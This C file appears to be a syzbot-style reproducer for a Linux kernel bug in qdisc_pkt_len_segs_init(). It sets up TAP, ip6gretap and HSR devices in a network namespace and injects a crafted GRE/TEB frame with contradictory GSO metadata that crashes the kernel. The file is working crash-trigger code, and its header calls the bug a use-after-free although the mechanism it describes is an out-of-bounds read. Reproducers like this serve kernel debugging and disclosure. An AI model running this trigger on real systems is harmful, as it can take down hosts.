/*
 * qdisc_uaf_repro.c
 *
 * Userspace C reproducer for the KASAN use-after-free in
 * qdisc_pkt_len_segs_init() (CVE candidate, syzbot reported).
 *
 * Trigger model (from the mailist.patch commit message):
 *
 *   1. Inject a TUN/TAP frame that carries a virtio_net_hdr setting
 *      GSO type to TCPv4.
 *   2. The frame is IPv6 + GRE + TEB (transparent Ethernet bridging).
 *   3. It is routed into an ip6gretap tunnel where GRE decap happens.
 *   4. __iptunnel_pull_header() pulls skb->data past the GRE header but
 *      leaves skb->transport_header pointing at the old outer L4 header.
 *   5. eth_type_trans() in the TEB path pulls another ETH_HLEN bytes.
 *   6. The inner Ethernet header is invalid, so eth_type_trans() classifies
 *      it as ETH_P_802_2 and does NOT reset transport_header.
 *   7. The resulting skb has a stale negative transport_header offset and
 *      still carries the contradictory GSO TCPv4 metadata.
 *   8. When HSR forwards the skb, dev_queue_xmit() -> qdisc_pkt_len_init()
 *      -> qdisc_pkt_len_segs_init() computes:
 *          hdr_len = skb_transport_header(skb) - skb->data;
 *      which underflows to a huge unsigned value.  The following
 *      __tcp_hdrlen(skb->data + hdr_len) reads wild memory and triggers
 *      KASAN / a kernel oops.
 *
 * Build:
 *   gcc -o qdisc_uaf_repro qdisc_uaf_repro.c
 *
 * Run (as root, or with CAP_NET_ADMIN + /dev/net/tun access):
 *   ./qdisc_uaf_repro
 *
 * Requires a KASAN-enabled kernel with CONFIG_TUN, CONFIG_NET_IPGRE,
 * CONFIG_IPV6_GRE, CONFIG_HSR and the gretap/ip6gretap tunnel drivers.
 */

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sched.h>
#include <stdarg.h>
#include <stddef.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_tun.h>
#include <linux/in6.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/neighbour.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_cls.h>
#include <linux/veth.h>
#include <linux/virtio_net.h>

static int nlmsg_seq;

struct nlmsg {
	char *pos;
	struct nlattr *nested[8];
	int nesting;
	char buf[4096];
};

static void netlink_init(struct nlmsg *nlmsg, int typ, int flags,
			 const void *data, int size)
{
	memset(nlmsg, 0, sizeof(*nlmsg));
	struct nlmsghdr *hdr = (struct nlmsghdr *)nlmsg->buf;
	hdr->nlmsg_type = typ;
	hdr->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | flags;
	hdr->nlmsg_seq = ++nlmsg_seq;
	memcpy(hdr + 1, data, size);
	nlmsg->pos = (char *)(hdr + 1) + NLMSG_ALIGN(size);
}

static void netlink_attr(struct nlmsg *nlmsg, int typ, const void *data,
			 int size)
{
	struct nlattr *attr = (struct nlattr *)nlmsg->pos;
	attr->nla_len = sizeof(*attr) + size;
	attr->nla_type = typ;
	if (size > 0)
		memcpy(attr + 1, data, size);
	nlmsg->pos += NLMSG_ALIGN(attr->nla_len);
}

static void netlink_nest(struct nlmsg *nlmsg, int typ)
{
	struct nlattr *attr = (struct nlattr *)nlmsg->pos;
	attr->nla_type = typ;
	nlmsg->pos += sizeof(*attr);
	nlmsg->nested[nlmsg->nesting++] = attr;
}

static void netlink_done(struct nlmsg *nlmsg)
{
	struct nlattr *attr = nlmsg->nested[--nlmsg->nesting];
	attr->nla_len = nlmsg->pos - (char *)attr;
}

static int netlink_send(struct nlmsg *nlmsg, int sock, bool dofail)
{
	if (nlmsg->pos > nlmsg->buf + sizeof(nlmsg->buf) || nlmsg->nesting)
		exit(1);

	struct nlmsghdr *hdr = (struct nlmsghdr *)nlmsg->buf;
	hdr->nlmsg_len = nlmsg->pos - nlmsg->buf;

	struct sockaddr_nl addr = { .nl_family = AF_NETLINK };
	ssize_t n = sendto(sock, nlmsg->buf, hdr->nlmsg_len, 0,
			   (struct sockaddr *)&addr, sizeof(addr));
	if (n != (ssize_t)hdr->nlmsg_len) {
		if (dofail)
			exit(1);
		return -1;
	}

	n = recv(sock, nlmsg->buf, sizeof(nlmsg->buf), 0);
	if (n < (ssize_t)sizeof(struct nlmsghdr)) {
		if (dofail)
			exit(1);
		return -1;
	}

	if (hdr->nlmsg_type == NLMSG_DONE)
		return 0;
	if (hdr->nlmsg_type == NLMSG_ERROR) {
		int err = -((struct nlmsgerr *)(hdr + 1))->error;
		if (err && dofail) {
			fprintf(stderr, "netlink error: %d\n", err);
			exit(1);
		}
		return err;
	}
	return 0;
}

static void netlink_add_device(struct nlmsg *nlmsg, int sock,
			       const char *type, const char *name)
{
	struct ifinfomsg hdr;
	memset(&hdr, 0, sizeof(hdr));
	netlink_init(nlmsg, RTM_NEWLINK, NLM_F_EXCL | NLM_F_CREATE,
		     &hdr, sizeof(hdr));
	netlink_attr(nlmsg, IFLA_IFNAME, name, strlen(name) + 1);
	netlink_nest(nlmsg, IFLA_LINKINFO);
	netlink_attr(nlmsg, IFLA_INFO_KIND, type, strlen(type) + 1);
	netlink_done(nlmsg);
	netlink_send(nlmsg, sock, true);
}

static void netlink_add_linked_device(struct nlmsg *nlmsg, int sock,
				      const char *type, const char *name,
				      const char *link)
{
	struct ifinfomsg hdr;
	memset(&hdr, 0, sizeof(hdr));
	netlink_init(nlmsg, RTM_NEWLINK, NLM_F_EXCL | NLM_F_CREATE,
		     &hdr, sizeof(hdr));
	netlink_attr(nlmsg, IFLA_IFNAME, name, strlen(name) + 1);
	int ifindex = if_nametoindex(link);
	netlink_attr(nlmsg, IFLA_LINK, &ifindex, sizeof(ifindex));
	netlink_nest(nlmsg, IFLA_LINKINFO);
	netlink_attr(nlmsg, IFLA_INFO_KIND, type, strlen(type) + 1);
	netlink_done(nlmsg);
	netlink_send(nlmsg, sock, true);
}

static void netlink_add_veth(struct nlmsg *nlmsg, int sock,
			     const char *name, const char *peer)
{
	struct ifinfomsg hdr;
	memset(&hdr, 0, sizeof(hdr));
	netlink_init(nlmsg, RTM_NEWLINK, NLM_F_EXCL | NLM_F_CREATE,
		     &hdr, sizeof(hdr));
	netlink_attr(nlmsg, IFLA_IFNAME, name, strlen(name) + 1);
	netlink_nest(nlmsg, IFLA_LINKINFO);
	netlink_attr(nlmsg, IFLA_INFO_KIND, "veth", strlen("veth") + 1);
	netlink_nest(nlmsg, IFLA_INFO_DATA);
	netlink_nest(nlmsg, VETH_INFO_PEER);
	nlmsg->pos += sizeof(struct ifinfomsg);
	netlink_attr(nlmsg, IFLA_IFNAME, peer, strlen(peer) + 1);
	netlink_done(nlmsg);
	netlink_done(nlmsg);
	netlink_done(nlmsg);
	netlink_send(nlmsg, sock, true);
}

static void netlink_add_hsr(struct nlmsg *nlmsg, int sock, const char *name,
			    const char *slave1, const char *slave2)
{
	struct ifinfomsg hdr;
	memset(&hdr, 0, sizeof(hdr));
	netlink_init(nlmsg, RTM_NEWLINK, NLM_F_EXCL | NLM_F_CREATE,
		     &hdr, sizeof(hdr));
	netlink_attr(nlmsg, IFLA_IFNAME, name, strlen(name) + 1);
	netlink_nest(nlmsg, IFLA_LINKINFO);
	netlink_attr(nlmsg, IFLA_INFO_KIND, "hsr", strlen("hsr") + 1);
	netlink_nest(nlmsg, IFLA_INFO_DATA);

	int idx1 = if_nametoindex(slave1);
	int idx2 = if_nametoindex(slave2);
	netlink_attr(nlmsg, IFLA_HSR_SLAVE1, &idx1, sizeof(idx1));
	netlink_attr(nlmsg, IFLA_HSR_SLAVE2, &idx2, sizeof(idx2));
	netlink_done(nlmsg);
	netlink_done(nlmsg);
	netlink_send(nlmsg, sock, true);
}

static void netlink_device_up(struct nlmsg *nlmsg, int sock,
			      const char *name)
{
	struct ifinfomsg hdr;
	memset(&hdr, 0, sizeof(hdr));
	hdr.ifi_index = if_nametoindex(name);
	hdr.ifi_flags = IFF_UP;
	hdr.ifi_change = IFF_UP;
	netlink_init(nlmsg, RTM_NEWLINK, 0, &hdr, sizeof(hdr));
	netlink_send(nlmsg, sock, true);
}

static void netlink_add_ingress_qdisc(struct nlmsg *nlmsg, int sock,
				      const char *name)
{
	struct tcmsg hdr;
	memset(&hdr, 0, sizeof(hdr));
	hdr.tcm_family = AF_UNSPEC;
	hdr.tcm_ifindex = if_nametoindex(name);
	hdr.tcm_handle = TC_H_INGRESS;
	hdr.tcm_parent = TC_H_INGRESS;
	netlink_init(nlmsg, RTM_NEWQDISC,
		     NLM_F_EXCL | NLM_F_CREATE, &hdr, sizeof(hdr));
	netlink_attr(nlmsg, TCA_KIND, "ingress", strlen("ingress") + 1);
	netlink_send(nlmsg, sock, false);
}

static void netlink_add_addr6(struct nlmsg *nlmsg, int sock,
			      const char *dev, const char *addr)
{
	struct in6_addr in6;
	inet_pton(AF_INET6, addr, &in6);

	struct ifaddrmsg hdr;
	memset(&hdr, 0, sizeof(hdr));
	hdr.ifa_family = AF_INET6;
	hdr.ifa_prefixlen = 64;
	hdr.ifa_scope = RT_SCOPE_UNIVERSE;
	hdr.ifa_index = if_nametoindex(dev);
	netlink_init(nlmsg, RTM_NEWADDR, NLM_F_CREATE | NLM_F_REPLACE,
		     &hdr, sizeof(hdr));
	netlink_attr(nlmsg, IFA_LOCAL, &in6, sizeof(in6));
	netlink_attr(nlmsg, IFA_ADDRESS, &in6, sizeof(in6));
	netlink_send(nlmsg, sock, true);
}

static int tun_alloc(const char *dev)
{
	int fd = open("/dev/net/tun", O_RDWR | O_NONBLOCK);
	if (fd < 0) {
		perror("open /dev/net/tun");
		exit(1);
	}

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
	ifr.ifr_flags = IFF_TAP | IFF_NO_PI | IFF_VNET_HDR;

	if (ioctl(fd, TUNSETIFF, &ifr) < 0) {
		perror("TUNSETIFF");
		exit(1);
	}
	return fd;
}

/*
 * Build the packet that will be injected through the TAP interface.
 *
 * The frame is crafted to be decapsulated by an ip6gretap tunnel and then
 * forwarded by an HSR device.  After GRE decap the skb->transport_header
 * points before skb->data; the invalid inner Ethernet header prevents
 * eth_type_trans() from resetting it.  The virtio_net_hdr marks the skb
 * as GSO TCPv4, so qdisc_pkt_len_segs_init() dereferences the stale
 * header and crashes.
 */
static size_t build_packet(uint8_t *buf, size_t maxlen)
{
	uint8_t *p = buf;
	memset(buf, 0, maxlen);

	/* virtio_net_hdr: request GSO TCPv4 so the skb enters the GSO path.
	 * The values are intentionally inconsistent with the actual IPv6/GRE
	 * contents to create the contradictory metadata that exposes the bug.
	 */
	struct virtio_net_hdr *vh = (struct virtio_net_hdr *)p;
	vh->flags = 0;
	vh->gso_type = VIRTIO_NET_HDR_GSO_TCPV4;
	vh->hdr_len = sizeof(struct ethhdr) + sizeof(struct ipv6hdr) + 4 +
		      sizeof(struct ethhdr);
	vh->gso_size = 1500;
	vh->csum_start = sizeof(struct ethhdr) + offsetof(struct ipv6hdr, payload_len);
	vh->csum_offset = 0;
	p += sizeof(*vh);

	/* Outer Ethernet header (TAP frame). */
	struct ethhdr *eth = (struct ethhdr *)p;
	memset(eth->h_dest, 0xaa, ETH_ALEN);
	memset(eth->h_source, 0xbb, ETH_ALEN);
	eth->h_proto = htons(ETH_P_IPV6);
	p += sizeof(*eth);

	/* Outer IPv6 header: multicast destination, matching the syzbot
	 * reproducer, so the frame is received by the ip6gretap tunnel.
	 */
	struct ipv6hdr *ip6 = (struct ipv6hdr *)p;
	ip6->version = 6;
	ip6->payload_len = htons(4 + sizeof(struct ethhdr) + 8);
	ip6->nexthdr = IPPROTO_GRE;  /* 47 */
	ip6->hop_limit = 255;
	inet_pton(AF_INET6, "fe80::aa", &ip6->saddr);
	inet_pton(AF_INET6, "ff02::1", &ip6->daddr);
	p += sizeof(*ip6);

	/* GRE header: TEB (transparent Ethernet bridging), no checksum/key. */
	*(uint16_t *)p = htons(0x0000);   /* flags */
	*(uint16_t *)(p + 2) = htons(ETH_P_TEB); /* protocol */
	p += 4;

	/* Inner Ethernet header: all-zero -> eth_type_trans() classifies as
	 * ETH_P_802_2 and does NOT reset transport_header.
	 */
	struct ethhdr *ieth = (struct ethhdr *)p;
	memset(ieth->h_dest, 0x00, ETH_ALEN);
	memset(ieth->h_source, 0x00, ETH_ALEN);
	ieth->h_proto = htons(0x0000);
	p += sizeof(*ieth);

	/* A handful of payload bytes. */
	memset(p, 0, 8);
	p += 8;

	return p - buf;
}

static void write_file(const char *path, const char *fmt, ...)
{
	char buf[256];
	va_list args;
	va_start(args, fmt);
	vsnprintf(buf, sizeof(buf), fmt, args);
	va_end(args);

	int fd = open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0)
		return;
	write(fd, buf, strlen(buf));
	close(fd);
}

static void setup_tun_sysctl(const char *dev)
{
	char path[128];
	snprintf(path, sizeof(path), "/proc/sys/net/ipv6/conf/%s/accept_dad", dev);
	write_file(path, "0");
	snprintf(path, sizeof(path), "/proc/sys/net/ipv6/conf/%s/router_solicitations", dev);
	write_file(path, "0");
}

int main(int argc, char **argv)
{
	if (getuid() != 0) {
		fprintf(stderr, "This reproducer must run as root.\n");
		return 1;
	}

	/* Create a private network namespace so we can freely create devices. */
	if (unshare(CLONE_NEWNET) < 0) {
		perror("unshare(CLONE_NEWNET)");
		return 1;
	}

	int rtsock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (rtsock < 0) {
		perror("socket NETLINK_ROUTE");
		return 1;
	}

	struct nlmsg nlmsg;

	/* Bring up loopback so local tunnel endpoints are reachable. */
	netlink_device_up(&nlmsg, rtsock, "lo");

	/* TAP device used to inject the malicious frame. */
	const char *tun_dev = "syz_tun";
	int tunfd = tun_alloc(tun_dev);
	setup_tun_sysctl(tun_dev);
	netlink_add_addr6(&nlmsg, rtsock, tun_dev, "fe80::aa");
	netlink_device_up(&nlmsg, rtsock, tun_dev);

	/* Create the ip6gretap tunnel with default parameters, as the syzbot
	 * reproducer does.  The injected IPv6/GRE/TEB frame will be received
	 * and decapsulated by this tunnel.
	 */
	const char *tun_name = "ip6gretap0";
	netlink_add_linked_device(&nlmsg, rtsock, "ip6gretap", tun_name, tun_dev);
	netlink_add_addr6(&nlmsg, rtsock, tun_name, "fe80::1b");
	netlink_device_up(&nlmsg, rtsock, tun_name);

	/* Veth pair used as HSR slaves. */
	netlink_add_veth(&nlmsg, rtsock, "hsr_slave_0", "veth0_to_hsr");
	netlink_add_veth(&nlmsg, rtsock, "hsr_slave_1", "veth1_to_hsr");
	netlink_device_up(&nlmsg, rtsock, "hsr_slave_0");
	netlink_device_up(&nlmsg, rtsock, "hsr_slave_1");
	netlink_device_up(&nlmsg, rtsock, "veth0_to_hsr");
	netlink_device_up(&nlmsg, rtsock, "veth1_to_hsr");

	/* HSR device forwards frames received on ip6gretap0, calling
	 * dev_queue_xmit() on the other slave and therefore hitting
	 * qdisc_pkt_len_segs_init().
	 */
	netlink_add_hsr(&nlmsg, rtsock, "hsr0", tun_name, "hsr_slave_0");
	netlink_device_up(&nlmsg, rtsock, "hsr0");

	/*
	 * Add ingress qdisc on the devices that will see the packet.
	 * sch_handle_ingress() calls qdisc_pkt_len_segs_init(), which is the
	 * vulnerable path for this bug.
	 */
	netlink_add_ingress_qdisc(&nlmsg, rtsock, tun_dev);
	netlink_add_ingress_qdisc(&nlmsg, rtsock, tun_name);
	netlink_add_ingress_qdisc(&nlmsg, rtsock, "hsr0");

	close(rtsock);

	/* Build and inject the frame a few times. */
	uint8_t pkt[512];
	size_t len = build_packet(pkt, sizeof(pkt));

	fprintf(stderr, "Injecting %zu bytes into %s...\n", len, tun_dev);
	for (int i = 0; i < 16; i++) {
		ssize_t n = write(tunfd, pkt, len);
		if (n < 0) {
			perror("write tun");
			break;
		}
	}

	close(tunfd);
	fprintf(stderr, "Done.  If the bug is present the kernel will oops.\n");
	return 0;
}
